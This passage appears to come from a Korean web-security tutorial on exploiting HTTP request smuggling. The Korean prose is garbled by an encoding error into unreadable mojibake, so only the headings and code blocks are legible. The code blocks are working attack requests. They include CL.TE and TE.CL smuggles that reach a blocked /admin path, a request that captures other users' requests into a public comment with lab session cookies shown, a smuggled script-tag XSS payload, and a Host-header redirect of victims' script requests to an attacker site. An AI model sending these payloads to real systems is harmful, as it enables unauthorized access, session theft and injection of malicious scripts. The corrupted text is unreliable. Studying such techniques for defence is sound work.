íƒ€ì´ë° ê¸°ìˆ ì˜ íš¨ê³¼ë¥¼ í™•ì¸í•œ í›„, í´ë¼ì´ì–¸íŠ¸ ìš”ì²­ì„ ì¡°ì‘í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ê°„ë‹¨í•œ ë°©ë²•ì€ ìš”ì²­ì„ ì˜¤ì—¼ì‹œí‚¤ëŠ” ê²ƒì„ ì‹œë„í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `/`ì— ëŒ€í•œ ìš”ì²­ì´ 404 ì‘ë‹µì„ ìƒì„±í•˜ë„ë¡ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ì „ì— ë…¼ì˜ëœ `CL.TE` ë° `TE.CL` ì˜ˆì œëŠ” í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì„ ì˜¤ì—¼ì‹œì¼œ 404 ì‘ë‹µì„ ìœ ë„í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ëŠ” ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•˜ë ¤ê³  í•©ë‹ˆë‹¤.

**Key Considerations**

ìš”ì²­ ë°€ì–´ë‚´ê¸° ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ë•Œ ë‹¤ë¥¸ ìš”ì²­ì— ê°„ì„­í•˜ëŠ” ê²½ìš° ë‹¤ìŒ ì‚¬í•­ì„ ì—¼ë‘ì— ë‘ì‹­ì‹œì˜¤:

* **Distinct Network Connections:** "ê³µê²©" ë° "ì •ìƒ" ìš”ì²­ì€ ë³„ë„ì˜ ë„¤íŠ¸ì›Œí¬ ì—°ê²°ì„ í†µí•´ ì „ì†¡ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ë‘ ìš”ì²­ ëª¨ë‘ì— ëŒ€í•´ ë™ì¼í•œ ì—°ê²°ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ì·¨ì•½ì ì˜ ì¡´ì¬ë¥¼ ê²€ì¦í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **Consistent URL and Parameters:** ë‘ ìš”ì²­ ëª¨ë‘ì— ëŒ€í•´ ë™ì¼í•œ URL ë° ë§¤ê°œë³€ìˆ˜ ì´ë¦„ì„ ì‚¬ìš©í•˜ë„ë¡ í•©ë‹ˆë‹¤. í˜„ëŒ€ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì¢…ì¢… URL ë° ë§¤ê°œë³€ìˆ˜ë¥¼ ê¸°ë°˜ìœ¼ë¡œ íŠ¹ì • ë°±ì—”ë“œ ì„œë²„ë¡œ ìš”ì²­ì„ ë¼ìš°íŒ…í•©ë‹ˆë‹¤. ì´ë¥¼ ì¼ì¹˜ì‹œí‚¤ë©´ ë‘ ìš”ì²­ì´ ë™ì¼í•œ ì„œë²„ì—ì„œ ì²˜ë¦¬ë  ê°€ëŠ¥ì„±ì´ ë†’ì•„ì§€ë©°, ì´ëŠ” ì„±ê³µì ì¸ ê³µê²©ì˜ ì „ì œ ì¡°ê±´ì…ë‹ˆë‹¤.
* **Timing and Racing Conditions:** "ì •ìƒ" ìš”ì²­ì€ "ê³µê²©" ìš”ì²­ì˜ ê°„ì„­ì„ ê°ì§€í•˜ê¸° ìœ„í•´ ë‹¤ë¥¸ ë™ì‹œ ì• í”Œë¦¬ì¼€ì´ì…˜ ìš”ì²­ê³¼ ê²½ìŸí•©ë‹ˆë‹¤. ë”°ë¼ì„œ "ê³µê²©" ìš”ì²­ ì§í›„ì— "ì •ìƒ" ìš”ì²­ì„ ì „ì†¡í•©ë‹ˆë‹¤. ë°”ìœ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ê²°ë¡ ì ì¸ ì·¨ì•½ì  í™•ì¸ì„ ìœ„í•´ ì—¬ëŸ¬ ë²ˆì˜ ì‹œë„ê°€ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Load Balancing Challenges:** ë¡œë“œ ë°¸ëŸ°ì„œ ì—­í• ì„ í•˜ëŠ” í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„ëŠ” ìš”ì²­ì„ ë‹¤ì–‘í•œ ë°±ì—”ë“œ ì‹œìŠ¤í…œì— ë¶„ë°°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. "ê³µê²©" ë° "ì •ìƒ" ìš”ì²­ì´ ì„œë¡œ ë‹¤ë¥¸ ì‹œìŠ¤í…œì— ë„ë‹¬í•˜ë©´ ê³µê²©ì´ ì„±ê³µí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì´ ë¡œë“œ ë°¸ëŸ°ì‹± ì¸¡ë©´ì€ ì·¨ì•½ì ì„ í™•ì¸í•˜ê¸° ìœ„í•´ ì—¬ëŸ¬ ë²ˆì˜ ì‹œë„ê°€ í•„ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Unintended User Impact:** ê³µê²©ì´ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ìš”ì²­(íƒì§€ë¥¼ ìœ„í•´ ë³´ë‚¸ "ì •ìƒ" ìš”ì²­ì´ ì•„ë‹˜)ì— ì˜ë„ì¹˜ ì•Šê²Œ ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ê²½ìš°, ì´ëŠ” ê³µê²©ì´ ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ìì—ê²Œ ì˜í–¥ì„ ë¯¸ì³¤ìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì§€ì†ì ì¸ í…ŒìŠ¤íŠ¸ëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìì—ê²Œ ë°©í•´ê°€ ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì‹ ì¤‘í•œ ì ‘ê·¼ì´ í•„ìš”í•©ë‹ˆë‹¤.

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

ë•Œë•Œë¡œ í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œëŠ” ë³´ì•ˆ ì¡°ì¹˜ë¥¼ ì‹œí–‰í•˜ì—¬ ë“¤ì–´ì˜¤ëŠ” ìš”ì²­ì„ ë©´ë°€íˆ ì¡°ì‚¬í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ëŸ¬í•œ ì¡°ì¹˜ëŠ” HTTP ìš”ì²­ ë°€ì–´ë‚´ê¸°ë¥¼ ì´ìš©í•˜ì—¬ ìš°íšŒí•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ì œí•œëœ ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•œ ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `/admin`ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì€ ì™¸ë¶€ì—ì„œ ê¸ˆì§€ë  ìˆ˜ ìˆìœ¼ë©°, í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œëŠ” ì´ëŸ¬í•œ ì‹œë„ë¥¼ ì ê·¹ì ìœ¼ë¡œ ì°¨ë‹¨í•©ë‹ˆë‹¤. ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³  ì´ í”„ë¡ì‹œëŠ” ë°€ì–´ë‚¸ HTTP ìš”ì²­ ë‚´ì˜ ë‚´ì¥ ìš”ì²­ì„ ê²€ì‚¬í•˜ì§€ ì•Šì„ ìˆ˜ ìˆì–´ ì´ëŸ¬í•œ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” í—ˆì ì„ ë‚¨ê¹ë‹ˆë‹¤.

ë‹¤ìŒ ì˜ˆì œëŠ” HTTP ìš”ì²­ ë°€ì–´ë‚´ê¸°ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡ íŠ¸ì—”ë“œ ë³´ì•ˆ ì œì–´ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. íŠ¹íˆ ì¼ë°˜ì ìœ¼ë¡œ í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œê°€ ë³´í˜¸í•˜ëŠ” `/admin` ê²½ë¡œë¥¼ ëª©í‘œë¡œ í•©ë‹ˆë‹¤:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE ê³µê²©ì—ì„œëŠ” ì´ˆê¸° ìš”ì²­ì— `Content-Length` í—¤ë”ê°€ ì‚¬ìš©ë˜ê³ , ì´í›„ì˜ ì„ë² ë””ë“œ ìš”ì²­ì€ `Transfer-Encoding: chunked` í—¤ë”ë¥¼ í™œìš©í•©ë‹ˆë‹¤. í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œëŠ” ì´ˆê¸° `POST` ìš”ì²­ì„ ì²˜ë¦¬í•˜ì§€ë§Œ ì„ë² ë””ë“œ `GET /admin` ìš”ì²­ì„ ê²€ì‚¬í•˜ì§€ ì•Šì•„ `/admin` ê²½ë¡œì— ëŒ€í•œ ë¬´ë‹¨ ì ‘ê·¼ì„ í—ˆìš©í•©ë‹ˆë‹¤.

**TE.CL ì˜ˆì œ**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
ë°˜ëŒ€ë¡œ, TE.CL ê³µê²©ì—ì„œëŠ” ì´ˆê¸° `POST` ìš”ì²­ì´ `Transfer-Encoding: chunked`ë¥¼ ì‚¬ìš©í•˜ê³ , ì´í›„ì— í¬í•¨ëœ ìš”ì²­ì€ `Content-Length` í—¤ë”ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤. CL.TE ê³µê²©ê³¼ ìœ ì‚¬í•˜ê²Œ, í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œëŠ” ë°€ë°˜ì…ëœ `GET /admin` ìš”ì²­ì„ ê°„ê³¼í•˜ì—¬, ì œí•œëœ `/admin` ê²½ë¡œì— ëŒ€í•œ ì ‘ê·¼ì„ ìš°ì—°íˆ í—ˆìš©í•©ë‹ˆë‹¤.

### í”„ë¡ íŠ¸ì—”ë“œ ìš”ì²­ ì¬ì‘ì„± ê³µê°œ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

ì‘ìš© í”„ë¡œê·¸ë¨ì€ ì¢…ì¢… **í”„ë¡ íŠ¸ì—”ë“œ ì„œë²„**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë“¤ì–´ì˜¤ëŠ” ìš”ì²­ì„ ìˆ˜ì •í•œ í›„ ë°±ì—”ë“œ ì„œë²„ë¡œ ì „ë‹¬í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ìˆ˜ì • ì‚¬í•­ì€ í´ë¼ì´ì–¸íŠ¸ì˜ IPë¥¼ ë°±ì—”ë“œë¡œ ì „ë‹¬í•˜ê¸° ìœ„í•´ `X-Forwarded-For: <IP of the client>`ì™€ ê°™ì€ í—¤ë”ë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ìˆ˜ì • ì‚¬í•­ì„ ì´í•´í•˜ëŠ” ê²ƒì€ **ë³´í˜¸ë¥¼ ìš°íšŒ**í•˜ê±°ë‚˜ **ìˆ¨ê²¨ì§„ ì •ë³´ë‚˜ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë“œëŸ¬ë‚´ëŠ” ë°©ë²•**ì„ ë°í˜€ë‚¼ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì¤‘ìš”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í”„ë¡ì‹œê°€ ìš”ì²­ì„ ì–´ë–»ê²Œ ë³€ê²½í•˜ëŠ”ì§€ ì¡°ì‚¬í•˜ë ¤ë©´, ë°±ì—”ë“œê°€ ì‘ë‹µì—ì„œ ì—ì½”í•˜ëŠ” POST ë§¤ê°œë³€ìˆ˜ë¥¼ ì°¾ìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ë§ˆì§€ë§‰ì— ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒê³¼ ìœ ì‚¬í•œ ìš”ì²­ì„ ì‘ì„±í•©ë‹ˆë‹¤:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
ì´ êµ¬ì¡°ì—ì„œëŠ” í›„ì† ìš”ì²­ êµ¬ì„± ìš”ì†Œê°€ `search=` ë’¤ì— ì¶”ê°€ë˜ë©°, ì´ëŠ” ì‘ë‹µì— ë°˜ì˜ë˜ëŠ” ë§¤ê°œë³€ìˆ˜ì…ë‹ˆë‹¤. ì´ ë°˜ì˜ì€ í›„ì† ìš”ì²­ì˜ í—¤ë”ë¥¼ ë…¸ì¶œì‹œí‚µë‹ˆë‹¤.

ì¤‘ìš”í•œ ê²ƒì€ ì¤‘ì²© ìš”ì²­ì˜ `Content-Length` í—¤ë”ë¥¼ ì‹¤ì œ ì½˜í…ì¸  ê¸¸ì´ì— ë§ì¶”ëŠ” ê²ƒì…ë‹ˆë‹¤. ì‘ì€ ê°’ìœ¼ë¡œ ì‹œì‘í•˜ì—¬ ì ì§„ì ìœ¼ë¡œ ì¦ê°€ì‹œí‚¤ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ë„ˆë¬´ ë‚®ì€ ê°’ì€ ë°˜ì˜ëœ ë°ì´í„°ë¥¼ ì˜ë¼ë‚´ê³ , ë„ˆë¬´ ë†’ì€ ê°’ì€ ìš”ì²­ì´ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê¸°ìˆ ì€ TE.CL ì·¨ì•½ì ì˜ ë§¥ë½ì—ì„œë„ ì ìš© ê°€ëŠ¥í•˜ì§€ë§Œ, ìš”ì²­ì€ `search=\r\n0`ìœ¼ë¡œ ì¢…ë£Œë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ì¤„ ë°”ê¿ˆ ë¬¸ìì™€ ê´€ê³„ì—†ì´ ê°’ì€ ê²€ìƒ‰ ë§¤ê°œë³€ìˆ˜ì— ì¶”ê°€ë©ë‹ˆë‹¤.

ì´ ë°©ë²•ì€ ì£¼ë¡œ í”„ë¡ íŠ¸ì—”ë“œ í”„ë¡ì‹œê°€ ìˆ˜í–‰í•œ ìš”ì²­ ìˆ˜ì • ì‚¬í•­ì„ ì´í•´í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©°, ë³¸ì§ˆì ìœ¼ë¡œ ìê°€ ì¡°ì‚¬ ì—­í• ì„ í•©ë‹ˆë‹¤.

### ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ìš”ì²­ ìº¡ì²˜í•˜ê¸° <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

POST ì‘ì—… ì¤‘ ë§¤ê°œë³€ìˆ˜ì˜ ê°’ìœ¼ë¡œ íŠ¹ì • ìš”ì²­ì„ ì¶”ê°€í•˜ì—¬ ë‹¤ìŒ ì‚¬ìš©ìì˜ ìš”ì²­ì„ ìº¡ì²˜í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ ì´ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ë‹¤ìŒ ìš”ì²­ì„ ë§¤ê°œë³€ìˆ˜ì˜ ê°’ìœ¼ë¡œ ì¶”ê°€í•˜ë©´ í›„ì† í´ë¼ì´ì–¸íŠ¸ì˜ ìš”ì²­ì„ ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ, **comment parameter**ëŠ” ê³µê°œì ìœ¼ë¡œ ì ‘ê·¼ ê°€ëŠ¥í•œ í˜ì´ì§€ì˜ ê²Œì‹œë¬¼ ëŒ“ê¸€ ì„¹ì…˜ ë‚´ì˜ ë‚´ìš©ì„ ì €ì¥í•˜ê¸° ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ì´í›„ ìš”ì²­ì˜ ë‚´ìš©ì€ ëŒ“ê¸€ë¡œ ë‚˜íƒ€ë‚©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ ê¸°ìˆ ì—ëŠ” í•œê³„ê°€ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ, ì´ëŠ” ë°€ë°˜ì…ëœ ìš”ì²­ì—ì„œ ì‚¬ìš©ëœ ë§¤ê°œë³€ìˆ˜ êµ¬ë¶„ìê¹Œì§€ì˜ ë°ì´í„°ë§Œ ìº¡ì²˜í•©ë‹ˆë‹¤. URL ì¸ì½”ë”©ëœ ì–‘ì‹ ì œì¶œì˜ ê²½ìš°, ì´ êµ¬ë¶„ìëŠ” `&` ë¬¸ìì…ë‹ˆë‹¤. ì´ëŠ” í”¼í•´ ì‚¬ìš©ì ìš”ì²­ì—ì„œ ìº¡ì²˜ëœ ë‚´ìš©ì´ ì²« ë²ˆì§¸ `&`ì—ì„œ ì¤‘ë‹¨ë¨ì„ ì˜ë¯¸í•˜ë©°, ì´ëŠ” ì¿¼ë¦¬ ë¬¸ìì—´ì˜ ì¼ë¶€ì¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ì´ ì ‘ê·¼ ë°©ì‹ì€ TE.CL ì·¨ì•½ì ì—ì„œë„ ìœ íš¨í•˜ë‹¤ëŠ” ì ì— ìœ ì˜í•  í•„ìš”ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê²½ìš°, ìš”ì²­ì€ `search=\r\n0`ìœ¼ë¡œ ëë‚˜ì•¼ í•©ë‹ˆë‹¤. ì¤„ ë°”ê¿ˆ ë¬¸ìì™€ ê´€ê³„ì—†ì´, ê°’ì€ ê²€ìƒ‰ ë§¤ê°œë³€ìˆ˜ì— ì¶”ê°€ë©ë‹ˆë‹¤.

### HTTP request smugglingì„ ì‚¬ìš©í•˜ì—¬ ë°˜ì‚¬ëœ XSSë¥¼ ì•…ìš©í•˜ê¸°

HTTP Request Smugglingì€ **Reflected XSS**ì— ì·¨ì•½í•œ ì›¹ í˜ì´ì§€ë¥¼ ì•…ìš©í•˜ëŠ” ë° í™œìš©ë  ìˆ˜ ìˆìœ¼ë©°, ìƒë‹¹í•œ ì´ì ì„ ì œê³µí•©ë‹ˆë‹¤:

* ëŒ€ìƒ ì‚¬ìš©ìì™€ì˜ ìƒí˜¸ì‘ìš©ì´ **í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
* HTTP ìš”ì²­ í—¤ë”ì™€ ê°™ì´ **ì¼ë°˜ì ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ”** ìš”ì²­ì˜ ì¼ë¶€ì—ì„œ XSSë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì›¹ì‚¬ì´íŠ¸ê°€ User-Agent í—¤ë”ë¥¼ í†µí•´ ë°˜ì‚¬ëœ XSSì— ì·¨ì•½í•œ ê²½ìš°, ë‹¤ìŒ í˜ì´ë¡œë“œëŠ” ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
ì´ í˜ì´ë¡œë“œëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì´ êµ¬ì¡°í™”ë˜ì—ˆìŠµë‹ˆë‹¤:

1. `Transfer-Encoding: chunked` í—¤ë”ê°€ ìˆëŠ” ì¼ë°˜ì ì¸ `POST` ìš”ì²­ì„ ì‹œì‘í•˜ì—¬ ë°€ë°˜ì…ì˜ ì‹œì‘ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
2. ì´ì–´ì„œ `0`ì„ ì¶”ê°€í•˜ì—¬ ì²­í¬ëœ ë©”ì‹œì§€ ë³¸ë¬¸ì˜ ëì„ í‘œì‹œí•©ë‹ˆë‹¤.
3. ê·¸ëŸ° ë‹¤ìŒ, `User-Agent` í—¤ë”ì— `<script>alert(1)</script>` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì£¼ì…í•œ ë°€ë°˜ì…ëœ `GET` ìš”ì²­ì´ ë„ì…ë˜ì–´, ì„œë²„ê°€ ì´ í›„ì† ìš”ì²­ì„ ì²˜ë¦¬í•  ë•Œ XSSê°€ íŠ¸ë¦¬ê±°ë©ë‹ˆë‹¤.

ë°€ë°˜ì…ì„ í†µí•´ `User-Agent`ë¥¼ ì¡°ì‘í•¨ìœ¼ë¡œì¨, í˜ì´ë¡œë“œëŠ” ì •ìƒ ìš”ì²­ ì œì•½ì„ ìš°íšŒí•˜ì—¬ ë¹„í‘œì¤€ì´ì§€ë§Œ íš¨ê³¼ì ì¸ ë°©ì‹ìœ¼ë¡œ ë°˜ì‚¬ëœ XSS ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤.

#### HTTP/0.9

{% hint style="danger" %}
ì‚¬ìš©ì ì½˜í…ì¸ ê°€ **`Content-type`**ì´ **`text/plain`**ì¸ ì‘ë‹µì— ë°˜ì˜ë˜ëŠ” ê²½ìš°, XSS ì‹¤í–‰ì„ ë°©ì§€í•©ë‹ˆë‹¤. ì„œë²„ê°€ **HTTP/0.9ë¥¼ ì§€ì›í•˜ëŠ” ê²½ìš° ì´ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆì„ì§€ë„ ëª¨ë¦…ë‹ˆë‹¤**!
{% endhint %}

HTTP/0.9 ë²„ì „ì€ 1.0 ì´ì „ì˜ ë²„ì „ìœ¼ë¡œ, **GET** ë™ì‚¬ë§Œ ì‚¬ìš©í•˜ë©° **í—¤ë”**ë¡œ ì‘ë‹µí•˜ì§€ ì•Šê³  ë³¸ì²´ë§Œ ì‘ë‹µí•©ë‹ˆë‹¤.

[**ì´ ê¸€**](https://mizu.re/post/twisty-python)ì—ì„œëŠ” ìš”ì²­ ë°€ë°˜ì…ê³¼ **ì‚¬ìš©ìì˜ ì…ë ¥ì— ì‘ë‹µí•˜ëŠ” ì·¨ì•½í•œ ì—”ë“œí¬ì¸íŠ¸**ë¥¼ ì•…ìš©í•˜ì—¬ HTTP/0.9ë¡œ ìš”ì²­ì„ ë°€ë°˜ì…í–ˆìŠµë‹ˆë‹¤. ì‘ë‹µì— ë°˜ì˜ë  ë§¤ê°œë³€ìˆ˜ëŠ” **ìœ íš¨í•œ ì‹¤í–‰ ê°€ëŠ¥í•œ JS ì½”ë“œê°€ í¬í•¨ëœ ê°€ì§œ HTTP/1.1 ì‘ë‹µ(í—¤ë”ì™€ ë³¸ì²´ í¬í•¨)**ì„ í¬í•¨í•˜ë¯€ë¡œ, ì‘ë‹µì€ `Content-Type`ì´ `text/html`ì¸ ìœ íš¨í•œ ì‹¤í–‰ ê°€ëŠ¥í•œ JS ì½”ë“œë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

### HTTP ìš”ì²­ ë°€ë°˜ì…ì„ í†µí•œ ì‚¬ì´íŠ¸ ë‚´ ë¦¬ë””ë ‰ì…˜ ì•…ìš© <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

ì‘ìš© í”„ë¡œê·¸ë¨ì€ ì¢…ì¢… ë¦¬ë””ë ‰ì…˜ URLì˜ `Host` í—¤ë”ì—ì„œ í˜¸ìŠ¤íŠ¸ ì´ë¦„ì„ ì‚¬ìš©í•˜ì—¬ í•œ URLì—ì„œ ë‹¤ë¥¸ URLë¡œ ë¦¬ë””ë ‰ì…˜í•©ë‹ˆë‹¤. ì´ëŠ” Apache ë° IISì™€ ê°™ì€ ì›¹ ì„œë²„ì—ì„œ ì¼ë°˜ì ì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í›„í–‰ ìŠ¬ë˜ì‹œ ì—†ì´ í´ë”ë¥¼ ìš”ì²­í•˜ë©´ ìŠ¬ë˜ì‹œë¥¼ í¬í•¨í•˜ë„ë¡ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤:
```
GET /home HTTP/1.1
Host: normal-website.com
```
ê²°ê³¼:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
ë¹„ë¡ ë¬´í•´í•´ ë³´ì´ì§€ë§Œ, ì´ í–‰ë™ì€ HTTP request smugglingì„ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¥¼ ì™¸ë¶€ ì‚¬ì´íŠ¸ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ëŠ” ë° ì¡°ì‘ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
ì´ ìŠ¤ë¨¸ê¸€ëœ ìš”ì²­ì€ ë‹¤ìŒì— ì²˜ë¦¬ëœ ì‚¬ìš©ì ìš”ì²­ì´ ê³µê²©ì ì œì–´ ì›¹ì‚¬ì´íŠ¸ë¡œ ë¦¬ë””ë ‰ì…˜ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
ê²°ê³¼:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì‚¬ìš©ìì˜ JavaScript íŒŒì¼ ìš”ì²­ì´ íƒˆì·¨ë©ë‹ˆë‹¤. ê³µê²©ìëŠ” ì‘ë‹µìœ¼ë¡œ ì•…ì„± JavaScriptë¥¼ ì œê³µí•˜ì—¬ ì‚¬ìš©ìë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ì„ í†µí•œ ì›¹ ìºì‹œ ì˜¤ì—¼ í™œìš© <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

ì›¹ ìºì‹œ ì˜¤ì—¼ì€ **í”„ë¡ íŠ¸ì—”ë“œ ì¸í”„ë¼ì˜ ì–´ë–¤ êµ¬ì„± ìš”ì†Œê°€ ì½˜í…ì¸ ë¥¼ ìºì‹œ**í•  ê²½ìš° ì‹¤í–‰ë  ìˆ˜ ìˆìœ¼ë©°, ì¼ë°˜ì ìœ¼ë¡œ ì„±ëŠ¥ í–¥ìƒì„ ìœ„í•´ ì‚¬ìš©ë©ë‹ˆë‹¤. ì„œë²„ì˜ ì‘ë‹µì„ ì¡°ì‘í•¨ìœ¼ë¡œì¨ **ìºì‹œë¥¼ ì˜¤ì—¼**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

